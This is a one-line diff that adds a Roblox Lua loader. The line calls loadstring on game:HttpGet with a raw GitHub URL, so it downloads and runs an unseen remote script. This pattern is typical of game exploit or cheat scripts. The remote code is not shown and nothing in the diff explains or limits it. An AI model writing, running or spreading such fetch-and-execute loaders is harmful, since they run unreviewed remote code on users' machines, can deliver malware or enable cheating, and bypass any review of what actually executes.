@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/smchko/im-genius/main/universal%20good%20script"))()
